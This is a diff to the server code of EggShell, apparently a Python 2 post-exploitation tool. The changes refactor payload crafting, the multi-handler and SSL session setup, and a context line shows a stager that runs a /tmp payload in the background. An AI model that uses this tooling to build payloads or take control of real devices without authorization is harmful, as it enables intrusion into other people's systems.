@@ -86,6 +86,7 @@ class Server:
         self.multihandler = MultiHandler(self)
         self.multihandler.start_background_server()
         self.multihandler.interact()
+        print "end start multihandler"
 
 
     def craft_payload(self,device,is_multi):
@@ -123,13 +124,13 @@ class Server:
             "/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
-            if "Linux" in device:
-                if is_multi == False:
+            if is_multi == False:
+                if "Linux" in device:
                     h.info_general("Detected Linux")
-            elif "GET / HTTP/1.1" in device:
-                raise ValueError("EggShell does not exploit safari, it is a payload creation tool.\nPlease look at the README.md file")
-            else:
-                h.info_general("Device unrecognized, trying python payload")
+                elif "GET / HTTP/1.1" in device:
+                    raise ValueError("EggShell does not exploit safari, it is a payload creation tool.\nPlease look at the README.md file")
+                else:
+                    h.info_general("Device unrecognized, trying python payload")
             f = open("resources/espl.py", "rb")
             payload = f.read()
             f.close()
@@ -158,7 +159,9 @@ class Server:
             h.info_general("Connecting to "+hostAddress)
         conn.send(identification_shell_command)
         device_type = conn.recv(128).strip()
-        
+        if not device_type:
+            return
+
         try:
             bash_stager, executable = self.craft_payload(device_type,is_multi)
         except Exception as e:
@@ -186,18 +189,12 @@ class Server:
                                  keyfile=".keys/server.key",
                                  ssl_version=ssl.PROTOCOL_SSLv23)
         device_info = json.loads(ssl_sock.recv(256))
-        device_info['type'] = device_type
-        device_info['is_multi'] = is_multi
-
-        if 'name' in device_info and device_info['name'] != '':
-            device_info['name'] = h.UNDERLINE_GREEN + device_info['name'] + h.ENDC + h.GREEN + "> " + h.ENDC;
-            return session.Session(self,ssl_sock,device_info)
-        elif is_multi:
-            return None
-        else:
-            h.info_general("Unable to get computer name")
-            raw_input("Press Enter To Continue")
-    
+        device_info.update({
+            'type': device_type,
+            'is_multi': is_multi,
+            })
+        return session.Session(self,ssl_sock,device_info)
+        
 
     def update_session(self,session):
         #single session
